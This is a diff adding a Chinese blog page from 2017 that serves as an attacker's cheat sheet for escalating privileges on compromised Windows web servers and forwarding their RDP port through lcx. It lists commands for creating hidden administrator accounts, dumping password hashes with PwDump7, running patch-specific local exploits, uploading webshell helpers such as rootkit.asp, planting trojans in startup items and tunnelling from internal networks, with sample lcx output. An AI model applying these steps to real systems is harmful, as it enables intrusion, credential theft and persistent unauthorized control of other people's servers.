@@ -1,0 +1,290 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>提权和lcx的使用 | warmeng</title>
+  <meta name="author" content="Mr.w">
+  
+  <meta name="description" content="小小的纪录一下提权的小攻略和lcx转发的小操作。">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="提权和lcx的使用"/>
+  <meta property="og:site_name" content="warmeng"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">warmeng</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="所有文章的匯總.">
+			  <i class=""></i>歸檔
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="所有文章的分類.">
+			  <i class=""></i>分類
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="所有文件的標籤.">
+			  <i class=""></i>標籤
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="新垣結衣的小跟班.">
+			  <i class=""></i>關於我
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 提权和lcx的使用</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>小小的纪录一下提权的小攻略和lcx转发的小操作。</p>
+<a id="more"></a>
+<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>毕业设计真的烦！写个博客换换心情！</p>
+<h2 id="提权攻略"><a href="#提权攻略" class="headerlink" title="提权攻略"></a>提权攻略</h2><p>1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user<br>2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。<br>3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以。<br>4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。<br>5.创建用户：net user username password ／add；设置为管理员：net localgroup administrators username ／add；如果要把用户设置成隐藏的用户，你可以在username后面加一个‘$’字符。<br>6.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！<br>7.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”<br>8.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。<br>9.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。<br>10.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程<br>11.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。<br>12.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。<br>13.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。<br>14.当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:\Documents and Settings\All Users\Application Data\Microsoft 目录 然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～1<br>15.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators<br>16.进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin<br>17.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:\xxx\exp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。<br>18.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现<br>19.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe &gt;1.txt<br>20.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe<br>21.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。 上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs<br>22.如何辨别服务器是不是内网？ 192.168.x.x 172.16.x.x 10.x.x.x</p>
+<hr>
+<h2 id="lcx使用手册"><a href="#lcx使用手册" class="headerlink" title="lcx使用手册"></a>lcx使用手册</h2><p> lcx.exe是个端口转发工具,相当于把肉鸡A上的3389端口转发到B机上,当然这个B机必须有外网IP.这样链接B机的3389度端口就相当于链接A机的3389. </p>
+<p> 下面就先详细讲解下LXC转发工具与使用方法：<br>如在本机B上监听 -listen 51 3389，在肉鸡A上运行-slave<br>本机ip 51 肉鸡ip 3389 那么在本地连127.0.0.1就可以连肉鸡的3389.第二条是本机转向。<br>例:现在有一个ip为222.221.221.22的websehll.用端口扫描发现开放了3389端口<br>可是我们输入外网IP可是不能正常链接。那么很有可能就是内网服务器。我们cmd（terminal）执行ipconfig（ifconfig）可以看出是否是内网服务器<br>上传lcx.exe到肉鸡 然后 cx.exe -listen 51 3389 意思是监听51端口并转发到3389端口。<br>显示如下[+] Listening port 51 ……<br>[+] Listen OK!<br>[+] Listening port 3389 ……<br>[+] Listen OK!<br>[+] Waiting for Client on port:51 ……<br> 然后在肉鸡上运行 lcx.exe -slave 你的IP 51 222.221.221.22 3389<br>222.221.221.22是我举例用的肉鸡IP.换成你的..运行以后本机监听端口。</p>
+<p>显示如下信息</p>
+<p>[+] Listening port 51 ……<br>[+] Listen OK!<br>[+] Listening port 3389 ……<br>[+] Listen OK!<br>[+] Waiting for Client on port:51 ……<br>[+] Accept a Client on port 55 from 222.221.221.22 ……<br>[+] Waiting another Client on port:3389….</p>
+<p>好了.现在在自己机子上链接 127.0.0.1 或者输你自己IP.<br>发现进去的不是自己机子,(或者自己机子根本连不上),而是肉鸡A了!优点,搞定内网肉鸡.<br>缺点,有点麻烦,而且每次都要通过sqltools先进行端口转发.当然也可以用反弹木马控制肉鸡</p>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一頁</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/04/12/the_upload(l)/" type="button" class="btn btn-default ">下一頁<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+    <div class="ds-thread" data-thread-key="2017/04/19/r&l/" data-title="提权和lcx的使用"
+         data-url="http://www.warmeng.com/2017/04/19/r&l/"></div>
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-04-19 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/攻略/">攻略<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+<script type="text/javascript">
+  var duoshuoQuery = { short_name: 'true' };
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';
+    ds.async = true;
+    ds.src = 'http://static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+
+<span id="busuanzi_container_page_pv">
+   本文总阅读量<span id="busuanzi_value_page_pv"></span>    次
+</span>
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2017 Mr.w
+  
+
+  <!--
+      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.    -->
+</p>
+<span id="busuanzi_container_site_uv"> 
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
